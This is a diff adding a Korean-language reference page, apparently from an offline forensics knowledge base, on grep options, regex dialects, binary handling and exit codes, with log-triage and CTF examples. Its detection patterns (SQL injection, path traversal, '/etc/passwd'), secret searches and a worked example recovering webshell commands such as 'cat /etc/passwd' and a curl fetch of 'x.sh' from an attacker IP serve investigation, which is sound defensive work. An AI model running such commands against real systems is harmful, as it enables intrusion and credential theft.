@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="ko" data-root="..">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>grep 기본 옵션 레퍼런스: -i -v -c -o -w -E -P -r 와 종료 코드 · FOR-0112 · 포렌식 오프라인 검색</title>
+<link rel="stylesheet" href="../assets/styles.css">
+</head>
+<body>
+<header class="site-header">
+  <div class="header-bar">
+    <a class="brand" href="../index.html">포렌식 오프라인 검색<span class="brand-sub">offline</span></a>
+    <div class="nav-search">
+      <input id="nav-q" type="search" placeholder="검색  (/)" autocomplete="off" spellcheck="false">
+    </div>
+    <nav class="nav-links">
+      <a href="../index.html?q=30%EC%B4%88">30초 트리아지</a>
+      <a href="../index.html?q=%EC%B9%98%ED%8A%B8%EC%8B%9C%ED%8A%B8">치트시트</a>
+    </nav>
+  </div>
+</header>
+<main class="page">
+  <div class="article-layout">
+    <article>
+      <div class="breadcrumb">
+        <a href="../index.html">홈</a> / <a href="../index.html?category=%EB%A1%9C%EA%B7%B8%2FRegex">로그/Regex</a> / FOR-0112
+      </div>
+      <header class="article-head">
+        <h1>grep 기본 옵션 레퍼런스: -i -v -c -o -w -E -P -r 와 종료 코드</h1>
+        <div class="article-tags">
+      <span class="badge badge-cat">로그/Regex</span>
+      <span class="badge badge-type">레퍼런스</span>
+      <span class="badge badge-diff diff-intermediate">중급</span>
+      <span class="badge badge-crit">critical</span>
+      <span class="chip">linux</span>
+      <span class="chip">windows</span>
+        </div>
+      </header>
+      <div class="answer-box">
+    <span class="answer-label">한 줄 결론</span>
+    <p>grep의 실전 조합은 -n(줄 번호), -c(개수), -o(매칭 부분만), -v(제외), -i(대소문자 무시), -r --include(재귀+파일 필터) 여섯 개에서 거의 끝나고, 기본 문법은 BRE이므로 + ? {} |를 쓰려면 -E, lookaround가 필요하면 -P를 붙여야 한다.</p>
+  </div>
+      <table class="meta-table">
+<tbody>
+<tr><th>추천 툴</th><td>grep, egrep, fgrep, zgrep, ripgrep</td></tr>
+<tr><th>artifact</th><td><code>access.log</code> · <code>auth.log</code> · <code>syslog</code> · <code>text log</code> · <code>memory strings</code></td></tr>
+<tr><th>파일 경로</th><td><code>/var/log/auth.log</code> · <code>/var/log/syslog</code> · <code>/var/log/apache2/access.log</code></td></tr>
+<tr><th>regex</th><td><code>flag\{[^}]+\}</code> · <code>cmd=[^&amp; ]*</code> · <code>^[0-9]{1,3}(\.[0-9]{1,3}){3}</code></td></tr>
+<tr><th>파일 형식</th><td><code>log</code> · <code>txt</code> · <code>csv</code> · <code>raw</code></td></tr>
+<tr><th>검색 별칭</th><td>grep 옵션 · grep 사용법 · grep 대소문자 · grep 제외 · grep 개수 · grep 재귀 · grep 바이너리</td></tr>
+</tbody>
+</table>
+      <div class="article-body">
+<h2 id="한-줄-결론">한 줄 결론</h2>
+<p><code>grep</code>의 실전 조합은 <code>-n</code>(줄 번호), <code>-c</code>(개수), <code>-o</code>(매칭 부분만), <code>-v</code>(제외), <code>-i</code>(대소문자 무시), <code>-r --include</code>(재귀+파일 필터) 여섯 개에서 거의 끝나고, 기본 문법은 <strong>BRE</strong>이므로 <code>+</code> <code>?</code> <code>{}</code> <code>|</code>를 쓰려면 <code>-E</code>, lookaround가 필요하면 <code>-P</code>를 붙여야 한다.</p>
+<h2 id="개념">개념</h2>
+<p><code>grep</code>은 <strong>줄 단위</strong> 도구다. 패턴이 줄 안에 있으면 그 줄 전체를 출력한다. 이 한 문장이 모든 동작을 설명한다.</p>
+<div class="table-wrap"><table><thead><tr><th>성질</th><th>결과</th></tr></thead><tbody><tr><td>줄 단위</td><td>여러 줄에 걸친 패턴은 못 잡는다 (<code>-z</code> 예외)</td></tr><tr><td>부분 일치</td><td><code>grep &#39;root&#39;</code>은 <code>chroot</code>도 잡는다 (<code>-w</code>/<code>-x</code>로 좁힌다)</td></tr><tr><td>출력은 줄 전체</td><td>값만 필요하면 <code>-o</code></td></tr><tr><td>기본 문법은 BRE</td><td><code>+</code> <code>?</code> <code>{</code> <code>}</code> <code>|</code> <code>(</code> <code>)</code>가 <strong>리터럴</strong></td></tr></tbody></table></div>
+<p>정규식 방언이 셋이며, 이것이 초보자가 가장 많이 막히는 지점이다.</p>
+<div class="table-wrap"><table><thead><tr><th></th><th>BRE (기본)</th><th>ERE (<code>-E</code>)</th><th>PCRE (<code>-P</code>)</th></tr></thead><tbody><tr><td>그룹</td><td><code>\(...\)</code></td><td><code>(...)</code></td><td><code>(...)</code></td></tr><tr><td>OR</td><td><code>\\|</code> (GNU 확장)</td><td><code>|</code></td><td><code>|</code></td></tr><tr><td>1회 이상</td><td><code>\+</code> (GNU 확장)</td><td><code>+</code></td><td><code>+</code></td></tr><tr><td>0 또는 1회</td><td><code>\?</code> (GNU 확장)</td><td><code>?</code></td><td><code>?</code></td></tr><tr><td>반복 횟수</td><td><code>\{2,4\}</code></td><td><code>{2,4}</code></td><td><code>{2,4}</code></td></tr><tr><td><code>\w</code> <code>\s</code> <code>\b</code></td><td>된다 (GNU 확장)</td><td>된다 (GNU 확장)</td><td>된다</td></tr><tr><td><code>\d</code> <code>\D</code></td><td><strong>안 된다</strong></td><td><strong>안 된다</strong></td><td>된다</td></tr><tr><td>게으른 수량자 <code>*?</code></td><td>안 된다</td><td>안 된다</td><td>된다</td></tr><tr><td>lookahead <code>(?=)</code> <code>(?!)</code></td><td>안 된다</td><td>안 된다</td><td>된다</td></tr><tr><td>lookbehind <code>(?&lt;=)</code> <code>(?&lt;!)</code></td><td>안 된다</td><td>안 된다</td><td>된다</td></tr><tr><td>명명 캡처 <code>(?&lt;n&gt;)</code></td><td>안 된다</td><td>안 된다</td><td>된다</td></tr><tr><td>이식성</td><td>최고</td><td>높다</td><td><strong>빌드에 따라 없을 수 있다</strong></td></tr></tbody></table></div>
+<p><code>-P</code>는 PCRE 라이브러리를 링크해 빌드한 <code>grep</code>에서만 동작한다. 없으면 <code>grep: -P supports only unibyte and UTF-8 locales</code> 또는 <code>grep: support for the -P option is not compiled into this --disable-perl-regexp binary</code> 같은 에러가 난다. 그럴 때는 <code>rg -P</code>로 넘어간다 (<a href="./ripgrep.html">FOR-0114</a>).</p>
+<p><code>egrep</code>/<code>fgrep</code>은 각각 <code>grep -E</code>/<code>grep -F</code>와 같지만 <strong>GNU grep에서 사용 시 deprecated 경고</strong>가 나올 수 있으므로 <code>-E</code>/<code>-F</code>를 쓴다.</p>
+<h2 id="파일-경로">파일 / 경로</h2>
+<p><code>grep</code>을 가장 많이 돌리는 대상이다.</p>
+<div class="table-wrap"><table><thead><tr><th>대상</th><th>경로</th><th>자주 찾는 것</th></tr></thead><tbody><tr><td>웹 접근 로그</td><td><code>/var/log/apache2/access.log</code>, <code>/var/log/nginx/access.log</code></td><td><code>POST</code>, <code>cmd=</code>, <code>.php</code></td></tr><tr><td>인증 로그</td><td><code>/var/log/auth.log</code>, <code>/var/log/secure</code></td><td><code>Failed password</code>, <code>Accepted password</code>, <code>sudo:</code></td></tr><tr><td>시스템 로그</td><td><code>/var/log/syslog</code>, <code>/var/log/messages</code></td><td>서비스 태그</td></tr><tr><td>소스/설정 트리</td><td><code>.</code> (재귀)</td><td><code>flag{</code>, 자격증명, 하드코딩 IP</td></tr><tr><td>메모리 덤프</td><td><code>*.raw</code>, <code>*.mem</code></td><td><code>-a</code> 필요</td></tr><tr><td>압축 로그</td><td><code>*.gz</code></td><td><code>zgrep</code> 또는 <code>rg -z</code></td></tr></tbody></table></div>
+<h2 id="주요-필드">주요 필드</h2>
+<p>옵션마다 <strong>입력 한 줄과 매칭/비매칭</strong>을 붙였다. 입력은 다음 3줄을 공통으로 쓴다.</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">1: 203.0.113.77 - - [14/Mar/2026:07:11:02 +0900] &quot;GET /admin/ HTTP/1.1&quot; 403 199
+2: 192.168.10.24 - - [14/Mar/2026:07:11:09 +0900] &quot;POST /upload.php HTTP/1.1&quot; 200 87
+3: Mar 14 07:11:02 web01 sshd[2841]: Failed password for root from 203.0.113.77</code></pre></div>
+<h3 id="출력을-바꾸는-옵션">출력을 바꾸는 옵션</h3>
+<div class="table-wrap"><table><thead><tr><th>옵션</th><th>긴 이름</th><th>하는 일</th></tr></thead><tbody><tr><td><code>-n</code></td><td><code>--line-number</code></td><td>줄 번호를 앞에 붙인다</td></tr><tr><td><code>-c</code></td><td><code>--count</code></td><td>매칭된 <strong>줄 수</strong>만 출력</td></tr><tr><td><code>-o</code></td><td><code>--only-matching</code></td><td>매칭된 <strong>부분만</strong> 출력 (한 줄에 여러 개면 여러 줄로)</td></tr><tr><td><code>-l</code></td><td><code>--files-with-matches</code></td><td>매칭이 있는 <strong>파일 이름만</strong></td></tr><tr><td><code>-L</code></td><td><code>--files-without-match</code></td><td>매칭이 <strong>없는</strong> 파일 이름만</td></tr><tr><td><code>-h</code></td><td><code>--no-filename</code></td><td>파일명 접두어 제거 (다중 파일에서도)</td></tr><tr><td><code>-H</code></td><td><code>--with-filename</code></td><td>파일명 접두어 강제 (단일 파일에서도)</td></tr><tr><td><code>-q</code></td><td><code>--quiet</code></td><td>아무것도 출력하지 않고 종료 코드만</td></tr><tr><td><code>-m N</code></td><td><code>--max-count=N</code></td><td>파일당 N건 찾으면 멈춘다</td></tr></tbody></table></div>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash">$ grep -n &#39;POST&#39; access.log
+2:192.168.10.24 - - [14/Mar/2026:07:11:09 +0900] &quot;POST /upload.php HTTP/1.1&quot; 200 87
+
+$ grep -c &#39;GET\|POST&#39; access.log
+2
+
+$ grep -o &#39;POST /[^ ]*&#39; access.log
+POST /upload.php</code></pre></div>
+<div class="table-wrap"><table><thead><tr><th>항목</th><th>값</th></tr></thead><tbody><tr><td><code>-o &#39;POST /[^ ]*&#39;</code> 매칭됨</td><td>2번 줄에서 <code>POST /upload.php</code></td></tr><tr><td><code>-o</code> 매칭 안 됨</td><td>1번 줄(<code>GET</code>), 3번 줄(HTTP 요청 아님)</td></tr><tr><td><code>-c</code> 주의</td><td>한 줄에 3개 매칭이 있어도 <strong>1</strong>로 센다. 총 개수는 <code>grep -o ... | wc -l</code></td></tr><tr><td><code>-m 1</code> 주의</td><td>&quot;최초 1건&quot;은 되지만 <strong>파일당</strong> 1건이다. 여러 파일에서는 파일마다 1건</td></tr></tbody></table></div>
+<h3 id="매칭-범위를-바꾸는-옵션">매칭 범위를 바꾸는 옵션</h3>
+<div class="table-wrap"><table><thead><tr><th>옵션</th><th>긴 이름</th><th>하는 일</th></tr></thead><tbody><tr><td><code>-i</code></td><td><code>--ignore-case</code></td><td>대소문자 무시</td></tr><tr><td><code>-v</code></td><td><code>--invert-match</code></td><td>매칭되지 <strong>않는</strong> 줄</td></tr><tr><td><code>-w</code></td><td><code>--word-regexp</code></td><td>단어 경계에서만 (앞뒤가 <code>[A-Za-z0-9_]</code>가 아니어야 한다)</td></tr><tr><td><code>-x</code></td><td><code>--line-regexp</code></td><td>줄 <strong>전체</strong>가 패턴과 일치해야 한다</td></tr><tr><td><code>-F</code></td><td><code>--fixed-strings</code></td><td>정규식이 아니라 <strong>문자 그대로</strong></td></tr><tr><td><code>-E</code></td><td><code>--extended-regexp</code></td><td>ERE</td></tr><tr><td><code>-P</code></td><td><code>--perl-regexp</code></td><td>PCRE</td></tr><tr><td><code>-e PAT</code></td><td><code>--regexp=PAT</code></td><td>패턴 여러 개 (OR). <code>-</code> 로 시작하는 패턴에도 필요</td></tr><tr><td><code>-f FILE</code></td><td><code>--file=FILE</code></td><td>파일에 든 패턴 목록(한 줄 하나)을 전부 OR</td></tr></tbody></table></div>
+<p><code>-w</code>와 <code>-x</code>의 차이를 예시로 굳혀 둔다. 입력이 <code>root</code>, <code>chroot</code>, <code>root:x:0:0</code>, <code>root </code> 네 줄일 때다.</p>
+<div class="table-wrap"><table><thead><tr><th>명령</th><th><code>root</code></th><th><code>chroot</code></th><th><code>root:x:0:0</code></th><th>이유</th></tr></thead><tbody><tr><td><code>grep &#39;root&#39;</code></td><td>매칭</td><td><strong>매칭</strong></td><td>매칭</td><td>부분 일치</td></tr><tr><td><code>grep -w &#39;root&#39;</code></td><td>매칭</td><td>매칭 안 됨</td><td>매칭</td><td><code>:</code>는 단어 문자가 아니므로 경계가 성립</td></tr><tr><td><code>grep -x &#39;root&#39;</code></td><td>매칭</td><td>매칭 안 됨</td><td><strong>매칭 안 됨</strong></td><td>줄 전체가 정확히 <code>root</code>여야 한다</td></tr></tbody></table></div>
+<p><code>-F</code>의 효과다.</p>
+<div class="table-wrap"><table><thead><tr><th>명령</th><th><code>192.168.1.1</code></th><th><code>192a168b1c1</code></th><th>이유</th></tr></thead><tbody><tr><td><code>grep &#39;192.168.1.1&#39;</code></td><td>매칭</td><td><strong>매칭</strong></td><td><code>.</code>이 임의의 한 문자</td></tr><tr><td><code>grep -F &#39;192.168.1.1&#39;</code></td><td>매칭</td><td>매칭 안 됨</td><td><code>.</code>이 리터럴</td></tr></tbody></table></div>
+<p><code>-v</code>는 노이즈 제거의 주력이다.</p>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash"># 헬스체크와 정적 리소스를 버린다
+grep -v &#39;/health&#39; access.log | grep -Ev &#39;\.(css|js|png|jpg|ico|woff2?)( |\?)&#39;</code></pre></div>
+<h3 id="문맥을-함께-보는-옵션">문맥을 함께 보는 옵션</h3>
+<div class="table-wrap"><table><thead><tr><th>옵션</th><th>하는 일</th></tr></thead><tbody><tr><td><code>-A N</code></td><td>매칭 줄 <strong>뒤</strong> N줄 함께</td></tr><tr><td><code>-B N</code></td><td>매칭 줄 <strong>앞</strong> N줄 함께</td></tr><tr><td><code>-C N</code></td><td>앞뒤 N줄 함께 (<code>-A N -B N</code>)</td></tr><tr><td><code>--group-separator=S</code></td><td>블록 사이 구분자 지정</td></tr><tr><td><code>--no-group-separator</code></td><td>블록 구분자(<code>--</code>) 제거 — 파이프에 넘길 때 쓴다</td></tr></tbody></table></div>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash">$ grep -n -B1 -A2 &#39;upload.php&#39; access.log
+1-203.0.113.77 - - [14/Mar/2026:07:11:02 +0900] &quot;GET /admin/ HTTP/1.1&quot; 403 199
+2:192.168.10.24 - - [14/Mar/2026:07:11:09 +0900] &quot;POST /upload.php HTTP/1.1&quot; 200 87</code></pre></div>
+<p>매칭 줄은 <code>:</code>, 문맥 줄은 <code>-</code>로 구분된다. <strong>파이프로 넘길 때 이 <code>-</code>가 섞이므로</strong> 이후 <code>awk &#39;{print $1}&#39;</code> 같은 처리가 어긋난다. 문맥은 사람이 읽을 때만 쓴다.</p>
+<h3 id="재귀와-파일-선택">재귀와 파일 선택</h3>
+<div class="table-wrap"><table><thead><tr><th>옵션</th><th>하는 일</th></tr></thead><tbody><tr><td><code>-r</code></td><td><code>--recursive</code>. 디렉터리 재귀. <strong>심볼릭 링크는 따라가지 않는다</strong>(명령행 인자로 준 것은 예외)</td></tr><tr><td><code>-R</code></td><td><code>--dereference-recursive</code>. 심볼릭 링크까지 따라간다</td></tr><tr><td><code>--include=GLOB</code></td><td>이 glob에 맞는 파일만</td></tr><tr><td><code>--exclude=GLOB</code></td><td>이 glob에 맞는 파일 제외</td></tr><tr><td><code>--exclude-dir=GLOB</code></td><td>디렉터리 제외</td></tr><tr><td><code>-s</code></td><td><code>--no-messages</code>. &quot;그런 파일 없음&quot;·권한 에러 숨김</td></tr><tr><td><code>-I</code></td><td>바이너리 파일 무시 (<code>--binary-files=without-match</code>)</td></tr></tbody></table></div>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash"># 로그만 재귀 검색, 줄 번호와 파일명 함께
+grep -rn --include=&#39;*.log&#39; &#39;flag{&#39; .
+
+# 노이즈 디렉터리 제외
+grep -rn --exclude-dir={.git,node_modules,dist} &#39;password&#39; .
+
+# 권한 에러를 숨기고 파일 목록만
+grep -rls --include=&#39;*.conf&#39; &#39;BEGIN RSA PRIVATE KEY&#39; /etc</code></pre></div>
+<p><code>-R</code>는 순환 심볼릭 링크에서 같은 파일을 반복 읽을 수 있으므로 증거물 트리에서는 <code>-r</code>를 기본으로 쓴다.</p>
+<h3 id="바이너리-데이터-처리">바이너리 데이터 처리</h3>
+<p>기본 동작은 <strong>매칭 내용을 보여주지 않는 것</strong>이다.</p>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash">$ grep &#39;flag{&#39; memdump.raw
+Binary file memdump.raw matches</code></pre></div>
+<div class="table-wrap"><table><thead><tr><th>옵션</th><th>동작</th></tr></thead><tbody><tr><td><code>-a</code> (<code>--text</code>)</td><td>바이너리를 텍스트로 취급해 매칭 줄을 출력</td></tr><tr><td><code>--binary-files=text</code></td><td><code>-a</code>와 같다</td></tr><tr><td><code>--binary-files=without-match</code></td><td><code>-I</code>와 같다. 바이너리는 아예 건너뛴다</td></tr><tr><td><code>-z</code> (<code>--null-data</code>)</td><td>입력을 <strong>NUL(<code>\0</code>)로 구분된 레코드</strong>로 본다</td></tr></tbody></table></div>
+<p><code>-a</code>로 뽑을 때는 반드시 <code>-o</code>를 함께 쓴다. 그렇지 않으면 &quot;한 줄&quot;이 수 MB일 수 있어 터미널이 잠긴다.</p>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash"># 메모리 덤프에서 flag 만 (줄 전체를 출력하지 않는다)
+grep -aoP &#39;flag\{[^}]{1,200}\}&#39; memdump.raw | sort -u</code></pre></div>
+<div class="table-wrap"><table><thead><tr><th>항목</th><th>값</th></tr></thead><tbody><tr><td><code>-ao &#39;flag\{[^}]*\}&#39;</code> 매칭됨</td><td><code>flag{c0re_dump_l3ak}</code></td></tr><tr><td>매칭 안 됨</td><td><code>FLAG{...}</code> (대문자, <code>-i</code> 필요), 널바이트로 쪼개진 <code>f\0l\0a\0g</code> (UTF-16LE)</td></tr></tbody></table></div>
+<p>UTF-16LE 문자열은 <code>grep</code>으로 안 잡힌다. <code>strings -el</code> 로 먼저 뽑아 파이프한다.</p>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash">strings -el memdump.raw | grep -o &#39;flag{[^}]*}&#39;</code></pre></div>
+<p><code>-z</code>는 <strong>압축 해제가 아니다.</strong> <code>find -print0</code> 같은 NUL 구분 스트림을 다룰 때 쓴다. 압축 로그는 <code>zgrep</code> 또는 <code>rg -z</code>다.</p>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash"># 파일명에 공백이 있어도 안전
+find . -name &#39;*.log&#39; -print0 | xargs -0 grep -n &#39;Failed password&#39;</code></pre></div>
+<h3 id="종료-코드">종료 코드</h3>
+<p>스크립트와 조건문에서 이 값을 쓴다.</p>
+<div class="table-wrap"><table><thead><tr><th>코드</th><th>의미</th></tr></thead><tbody><tr><td><code>0</code></td><td>한 건 이상 매칭됨</td></tr><tr><td><code>1</code></td><td>매칭 없음 (에러 아님)</td></tr><tr><td><code>2</code></td><td>파일 없음·권한 없음·정규식 오류 등 실제 오류</td></tr></tbody></table></div>
+<p><code>-q</code>와 조합하면 &quot;있는지 없는지&quot;만 빠르게 판정한다. <code>-q</code>는 첫 매칭에서 즉시 종료하므로 대용량에서 특히 빠르다.</p>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash">if grep -q &#39;Accepted password&#39; auth.log; then echo &#39;성공 로그온 있음&#39;; fi
+
+# 파일 목록에서 패턴이 없는 것만 찾기 (-L)
+grep -Lq &#39;PermitRootLogin&#39; /etc/ssh/sshd_config</code></pre></div>
+<p>주의할 점이 두 개다.</p>
+<ul><li><code>grep -c PAT file</code>은 개수가 <code>0</code>이면 <strong>종료 코드 1</strong>을 반환한다. <code>set -e</code> 스크립트에서 중단된다.</li><li>파이프에서는 <code>$?</code>가 마지막 명령의 코드다. <code>grep ... | wc -l</code>의 종료 코드는 <code>wc</code>의 것이며 항상 0이다.</li></ul>
+<h2 id="빠른-명령">빠른 명령</h2>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash">grep -n &#39;Failed password&#39; auth.log</code></pre></div>
+<p>실전 조합 모음이다.</p>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash"># 1) 상위 IP — grep 으로 좁히고 필드로 센다
+grep &#39;Failed password&#39; auth.log | awk &#39;{for(i=1;i&lt;=NF;i++) if($i==&quot;from&quot;) print $(i+1)}&#39; |
+  sort | uniq -c | sort -nr | head
+
+# 2) 총 매칭 개수(줄 수가 아니라 실제 개수)
+grep -o &#39;cmd=&#39; access.log | wc -l
+
+# 3) 여러 패턴 OR — 공격 유형 스캔
+grep -nE &#39;union[[:space:]]+select|\.\./|cmd=|&lt;script|/etc/passwd&#39; access.log
+
+# 4) 패턴 파일로 IOC 일괄 검색
+printf &#39;%s\n&#39; 203.0.113.77 198.51.100.5 evil.example.com &gt; ioc.txt
+grep -nFf ioc.txt access.log
+
+# 5) 공격 IP 의 요청 흐름만, 상태 코드 200 만
+grep &#39;^203\.0\.113\.77 &#39; access.log | awk &#39;$9==200&#39;
+
+# 6) 노이즈 제거 후 URI 상위
+grep -v &#39;/health&#39; access.log |
+  grep -Ev &#39;\.(css|js|png|jpg|ico|woff2?)( |\?)&#39; |
+  awk &#39;{print $7}&#39; | sort | uniq -c | sort -nr | head
+
+# 7) 시간 구간만 (문자열 비교로 충분하다)
+grep &#39;14/Mar/2026:07:1[0-9]:&#39; access.log
+
+# 8) 압축된 로테이션 로그까지 전부
+zgrep -h &#39;POST /upload&#39; access.log.*.gz | wc -l
+
+# 9) 재귀 + 파일 필터 + 줄 번호 (CTF 첨부 폴더 전체 훑기)
+grep -rniI --include=&#39;*.txt&#39; --include=&#39;*.log&#39; --include=&#39;*.json&#39; &#39;flag&#39; . | head -50
+
+# 10) 매칭이 없는 파일 찾기 (설정 누락 점검)
+grep -rL &#39;Authentication&#39; ./configs</code></pre></div>
+<p>PowerShell 환경에서는 <code>Select-String</code>이 같은 역할을 한다. 옵션 대응은 <a href="./powershell-select-string.html">FOR-0121</a>에 있다.</p>
+<h2 id="함께-보는-artifact">함께 보는 artifact</h2>
+<div class="table-wrap"><table><thead><tr><th>grep으로 얻은 것</th><th>다음 목표</th></tr></thead><tbody><tr><td>매칭 줄 번호</td><td><code>sed -n &#39;N,Mp&#39;</code>로 그 구간 전체를 본다 (<a href="./head-tail-less.html">FOR-0118</a>)</td></tr><tr><td>매칭 IP</td><td>필드 완전 일치로 재집계 (<a href="./awk-fields.html">FOR-0115</a>)</td></tr><tr><td>빈도 순위</td><td><code>sort | uniq -c | sort -nr</code> (<a href="./sort-uniq.html">FOR-0117</a>)</td></tr><tr><td><code>-P</code>가 없다</td><td><code>rg -P</code> (<a href="./ripgrep.html">FOR-0114</a>)</td></tr><tr><td>ERE 문법이 필요하다</td><td><code>grep -E</code> 실전 (<a href="./grep-e-regex.html">FOR-0113</a>)</td></tr><tr><td>메모리 덤프의 문자열</td><td><code>strings -el</code> + <code>grep</code></td></tr><tr><td>로그 형식을 모른다</td><td>형식 판별 (<a href="./log-triage.html">FOR-0111</a>)</td></tr></tbody></table></div>
+<h2 id="흔한-실수">흔한 실수</h2>
+<ul><li><strong>BRE에서 <code>+</code>·<code>?</code>·<code>{}</code>·<code>|</code>를 그냥 쓰는 것.</strong> <code>grep &#39;a+&#39;</code>는 문자 <code>a+</code>를 찾는다. ERE가 필요하면 <code>-E</code>를 붙이거나 BRE에서 <code>\+</code>로 이스케이프한다.</li><li><strong><code>-c</code>를 &quot;매칭 개수&quot;로 착각하는 것.</strong> <code>-c</code>는 <strong>줄 수</strong>다. 한 줄에 IP가 3개 있으면 1로 센다. 실제 개수는 <code>grep -o ... | wc -l</code>.</li><li><strong><code>-o</code> 없이 바이너리에 <code>-a</code>를 쓰는 것.</strong> 덤프 전체가 한 줄로 취급되어 수 MB가 쏟아진다. <code>-a</code>는 항상 <code>-o</code>와 함께.</li><li><strong><code>Binary file ... matches</code>를 &quot;못 찾았다&quot;로 읽는 것.</strong> 찾은 것이다. 내용을 보려면 <code>-a</code>를 붙인다.</li><li><strong><code>-P</code>가 항상 있다고 가정하는 것.</strong> 배포판 빌드에 따라 없다. lookaround가 필요하면 <code>rg -P</code>나 Python으로 옮기는 편이 안전하다.</li><li><strong><code>-z</code>를 압축 옵션으로 아는 것.</strong> <code>-z</code>는 NUL 구분 입력용이다. 압축은 <code>zgrep</code> 또는 <code>rg -z</code>.</li><li><strong><code>grep -r</code>의 결과를 그대로 파이프에 넣는 것.</strong> 출력이 <code>파일명:줄내용</code>이므로 <code>awk &#39;{print $1}&#39;</code>이 파일명을 집는다. <code>-h</code>로 접두어를 없애거나 <code>-o</code>로 값만 뽑는다.</li><li><strong><code>-A</code>/<code>-B</code> 결과를 집계에 쓰는 것.</strong> 문맥 줄은 <code>-</code>로, 매칭 줄은 <code>:</code>로 붙고 블록 사이에 <code>--</code>가 들어간다. 집계 전에 문맥을 끈다.</li><li><strong><code>-i</code>를 습관적으로 붙이는 것.</strong> flag 문자열이나 Base64는 대소문자가 의미를 가진다. <code>-i</code>가 오탐을 부른다.</li><li><strong><code>grep &#39;root&#39;</code>로 계정을 세는 것.</strong> <code>chroot</code>·<code>rootkit</code>도 걸린다. 단어라면 <code>-w</code>, 필드라면 <code>awk</code>의 완전 일치를 쓴다.</li><li><strong>셸 확장을 잊는 것.</strong> 패턴은 항상 <strong>작은따옴표</strong>로 감싼다. 큰따옴표 안의 <code>$</code>·`<code> </code> `<code>·</code>\`가 셸에 먹힌다.</li><li><strong><code>--include</code>를 <code>-r</code> 없이 쓰는 것.</strong> <code>--include</code>는 재귀 검색의 파일 필터다. 단일 파일 인자에는 영향이 없다.</li></ul>
+<h2 id="mini-example">mini example</h2>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">문제:
+&quot;압축 포함 로테이션된 웹 로그 전체에서 웹셸에 전달된 명령 문자열을 모두 나열하세요.&quot;
+첨부: access.log, access.log.1, access.log.2.gz, access.log.3.gz
+
+1. 첫 시도 (실패):
+   $ grep -o &#39;cmd=.*&#39; access.log*
+   access.log:cmd=id HTTP/1.1&quot; 200 42
+   access.log:cmd=whoami HTTP/1.1&quot; 200 38
+   ...
+   -&gt; .* 가 욕심쟁이라 줄 끝까지 삼켰다. 명령만이 아니라 프로토콜·상태코드까지 붙었다.
+      게다가 .gz 파일은 &quot;Binary file access.log.2.gz matches&quot; 로만 나왔다.
+
+2. 두 번째 시도 (또 실패):
+   $ grep -o &#39;cmd=[^ ]*&#39; access.log*
+   access.log:cmd=cat+/etc/passwd
+   ...
+   -&gt; 값은 깔끔해졌지만 여전히 .gz 는 못 읽는다.
+      -a 를 붙이면 압축 바이너리를 그대로 읽어 쓰레기가 나온다. -a 는 답이 아니다.
+
+3. 접근 변경 — 압축은 zgrep 이 푼다
+   $ zgrep -ho &#39;cmd=[^&amp; ]*&#39; access.log access.log.1 access.log.2.gz access.log.3.gz |
+       sort | uniq -c | sort -nr
+        41 cmd=id
+        33 cmd=whoami
+        12 cmd=cat+/etc/passwd
+         9 cmd=ls+-la+/var/www
+         2 cmd=curl+http://203.0.113.77:8000/x.sh
+   -&gt; zgrep 은 비압축 파일도 그대로 처리한다. -h 로 파일명 접두어를 없애 집계가 깨지지 않게 한다.
+
+4. URL 인코딩 풀기 — + 는 공백, %2F 는 /
+   $ zgrep -ho &#39;cmd=[^&amp; ]*&#39; access.log* | sed &#39;s/^cmd=//; s/+/ /g&#39; | sort -u
+   cat /etc/passwd
+   curl http://203.0.113.77:8000/x.sh
+   id
+   ls -la /var/www
+   whoami
+
+5. 교차검증 — 개수를 두 방법으로
+   $ zgrep -c &#39;cmd=&#39; access.log*        # 파일별 &quot;줄 수&quot;
+   access.log:74
+   access.log.1:19
+   access.log.2.gz:3
+   access.log.3.gz:1
+   $ zgrep -ho &#39;cmd=&#39; access.log* | wc -l
+   97
+   -&gt; 74+19+3+1 = 97. 일치. 한 줄에 cmd= 가 두 번 나온 경우가 없다는 뜻이다.
+
+정답: id, whoami, cat /etc/passwd, ls -la /var/www, curl http://203.0.113.77:8000/x.sh</code></pre></div>
+<p>1·2단계의 교훈이 두 개다. <strong><code>-o</code>에는 <code>.*</code> 대신 <code>[^구분자]*</code>를 쓴다</strong>, 그리고 <strong>압축 파일에 <code>-a</code>를 붙이지 말고 <code>zgrep</code>으로 넘긴다.</strong></p>
+<h2 id="출처">출처</h2>
+<ul><li>SRC-015 — GNU grep manual: 전체 옵션 정의, BRE/ERE/PCRE 지원 범위, 종료 코드 0/1/2, <code>--binary-files</code> 동작, <code>-r</code>와 <code>-R</code>의 심볼릭 링크 차이</li><li>SRC-055 — ripgrep User Guide: <code>-P</code>(PCRE2) 대안 및 <code>grep</code>과의 기본 동작 차이 비교용</li><li><code>-P</code> 사용 가능 여부와 에러 메시지 문구는 배포판 빌드 옵션에 따라 다르므로 실제 환경에서 <code>grep -P &#39;&#39; /dev/null</code>로 확인할 것</li><li><code>egrep</code>/<code>fgrep</code>의 deprecated 경고 출력 여부는 grep 버전에 따라 다르다</li></ul>
+      </div>
+      <section class="related">
+  <h2>관련 글</h2>
+  <div class="related-grid">
